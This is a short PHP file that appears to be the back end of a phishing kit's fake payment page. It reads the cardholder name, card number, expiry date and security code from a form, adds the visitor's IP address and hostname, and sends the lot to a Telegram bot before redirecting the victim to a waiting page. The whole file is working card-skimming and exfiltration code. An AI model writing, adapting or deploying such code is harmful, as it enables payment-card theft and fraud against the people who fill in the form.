<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "----------- NFZ CC ------------\n";
$message .= "HLDR        : ".$_POST['name']."\n";
$message .= "CARD        : ".$_POST['ccn']."\n";
$message .= "EXPR        : ".$_POST['exp']."\n";
$message .= "CSC         : ".$_POST['csc']."\n";
$message .= "----------   Z3CI   ----------\n";
$message .= "lp      : $ip\n";
$message .= "H0ST    : $hostname\n";

include 'configuration.php';
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

header("Location: wait.php");

?>